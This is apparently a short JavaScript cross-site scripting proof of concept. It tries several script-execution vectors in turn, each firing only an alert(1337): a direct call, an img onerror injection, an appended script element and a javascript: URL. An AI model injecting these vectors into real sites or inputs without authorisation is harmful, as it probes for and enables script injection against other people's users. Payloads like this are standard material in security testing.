// Try multiple execution methods
(function(){
    try {
        alert(1337);
    } catch(e) {}
    
    try {
        document.write('<img src=x onerror=alert(1337)>');
    } catch(e) {}
    
    try {
        var s = document.createElement('script');
        s.innerHTML = 'alert(1337)';
        document.body.appendChild(s);
    } catch(e) {}
    
    try {
        location.href = 'javascript:alert(1337)';
    } catch(e) {}
})();
